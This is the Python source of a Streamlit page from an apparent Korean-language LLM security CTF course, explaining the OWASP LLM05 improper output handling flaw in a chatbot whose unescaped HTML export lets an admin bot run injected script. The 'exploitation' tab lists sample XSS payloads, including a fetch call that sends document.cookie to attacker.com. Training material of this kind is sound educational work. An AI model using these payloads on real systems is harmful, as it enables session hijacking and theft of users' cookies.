# pages/edu05.py
import streamlit as st
from utils.ui import render_sidebar_menu
from utils.auth import require_login

# CSS 파일 로드
with open("static/styles.css", "r", encoding="utf-8") as f:
    css_content = f.read()

st.markdown(f"<style>{css_content}</style>", unsafe_allow_html=True)

user = require_login()

# 상단 메인 버튼
col1, col2, col3 = st.columns([1, 2, 1])
with col1:
    st.page_link("pages/ctf05.py", label="👉 CTF05으로", use_container_width=True)
with col3:
    st.page_link("pages/edu06.py", label="👉 다음으로", use_container_width=True)

# 사이드바 렌더링
render_sidebar_menu()

# 콘텐츠 본문
col1, col2, col3 = st.columns([1, 2, 1])
with col2:
    st.image("images/edu05.png", width=500)

st.markdown("## OWASP LLM05 - Improper Output Handling(부적절한 출력 처리)")

tab1, tab2, tab3, tab4, tab5, tab6 = st.tabs(["취약점 설명", "발생 가능한 피해", "시스템 동작 과정", "악용 가능성", "보안 중요성", "요약"])

# 취약점 설명
with tab1:
    st.markdown(
    """
    <div class='info-box info-box-pink'>
        <p>부적절한 출력 처리(Improper Output Handling)는 웹 애플리케이션이 사용자 입력을 적절히 검증하거나 인코딩하지 않고 HTML에 삽입할 때 발생하는 보안 취약점입니다.</p>
        <p>공격자는 악의적인 JavaScript 코드를 삽입해 다른 사용자의 브라우저에서 실행되도록 유도할 수 있으며, 이로 인해 쿠키 탈취, 정보 유출, 세션 하이재킹 등 다양한 보안 위협이 발생할 수 있습니다.</p>
    </div>
    """,
    unsafe_allow_html=True
)

# 발생 가능한 피해
with tab2:
    st.markdown(
    """
    <div class='info-box info-box-pink'>
        <p>쿠키 탈취: admin_session 쿠키를 탈취하여 관리자 권한을 획득</p>
        <p>세션 하이재킹: 탈취한 세션 정보로 무단 접근 가능</p>
        <p>악성 스크립트 실행: 관리자 브라우저에서 JavaScript 실행 가능</p>
        <p>정보 유출: 내부 시스템 정보 및 민감 정보 외부 유출</p>
        <p>시스템 조작: 관리자 권한을 이용한 설정 변경, 데이터 훼손 가능</p>
    </div>
    """,
    unsafe_allow_html=True
)

# 시스템 동작 과정
with tab3:
    st.markdown(
    """
    <div class='info-box info-box-pink'>
        <p>CTF05 시나리오는 대화 내역 저장과 HTML 공유 기능을 악용하는 방식으로 구성됩니다.</p>
        <p><strong>① 대화 저장:</strong> 사용자가 ChatLLL에 입력한 메시지는 conversation_history에 저장됩니다.</p>
        <p><strong>② LLM 호출:</strong> conversation_history를 기반으로 OpenAI GPT-3.5-turbo가 응답을 생성합니다.</p>
        <p><strong>③ HTML 공유:</strong> “HTML 파일 생성하기” 버튼을 누르면 전체 대화 내용이 HTML 템플릿에 그대로 삽입되며, 이때 입력은 이스케이프 없이 출력됩니다.</p>
        <p><strong>④ 관리자 리뷰:</strong> 관리자 봇이 해당 HTML을 열면, 사용자 입력에 포함된 <code>&lt;script&gt;</code>가 실행됩니다.</p>
        <p><strong>⑤ XSS 페이로드 실행:</strong> 쿠키 탈취 및 스크립트 실행이 발생하며, 조건을 만족하면 FLAG가 노출됩니다.</p>
    </div>
    """,
    unsafe_allow_html=True
)

# 악용 가능성
with tab4:
    st.markdown(
    """
    <div class='info-box info-box-pink'>
        <p>공격자는 악성 JavaScript 코드를 챗봇 입력에 삽입하여 HTML 공유 기능을 통해 실행을 유도할 수 있습니다.</p>
        <ul>
            <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> : 경고창 실행</li>
            <li><code>&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code> : 쿠키 탈취</li>
            <li><code>&lt;script&gt;document.body.innerHTML = '&lt;h1&gt;Hacked!&lt;/h1&gt;'&lt;/script&gt;</code> : DOM 조작</li>
            <li><code>&lt;img src=x onerror="alert('XSS')"&gt;</code> : 이미지 태그를 이용한 페이로드 실행</li>
            <li><code>&amp;lt;script&amp;gt;</code> : HTML 엔티티 우회 방식으로 필터링 우회</li>
        </ul>
        <p>공격자가 생성한 HTML 파일을 관리자 봇이 열면, admin_session=ctf05_flag 쿠키가 탈취되어 플래그가 노출됩니다.</p>
    </div>
    """,
    unsafe_allow_html=True
)

# 보안 중요성
with tab5:
    st.markdown(
    """
    <div class='info-box info-box-pink'>
        <p>부적절한 출력 처리는 사용자 콘텐츠가 관리자 UI, 로그, 알림 채널 등에 전달될 때 치명적인 위협을 초래합니다.</p>
        <p>XSS 및 HTML 인젝션 공격은 시스템 권한 탈취, 데이터 위조·삭제, 개인정보 유출 등 심각한 결과로 이어질 수 있습니다.</p>
        <p>따라서 출력 단계에서도 입력 검증, 콘텐츠 인코딩, CSP 설정, XSS 필터링을 포함한 다층 방어가 필수이며, 2차 전달 경로까지 전수 검증해야 합니다.</p>
        <p>정적 분석 및 동적 침투 테스트를 정기적으로 수행하지 않으면, 단 한 번의 출력 누락으로 대규모 피해가 발생할 수 있습니다.</p>
    </div>
    """,
    unsafe_allow_html=True
)

# 요약
with tab6:
    st.markdown(
    """
    <div class='info-box info-box-pink'>
        <p>ChatLLL 챗봇의 대화 내용에 악성 JavaScript를 삽입하고 HTML 공유 기능을 악용해, 관리자 브라우저에서 실행되도록 유도함으로써 admin_session 쿠키를 탈취하고 FLAG를 획득할 수 있습니다.</p>
    </div>
    """,
    unsafe_allow_html=True
)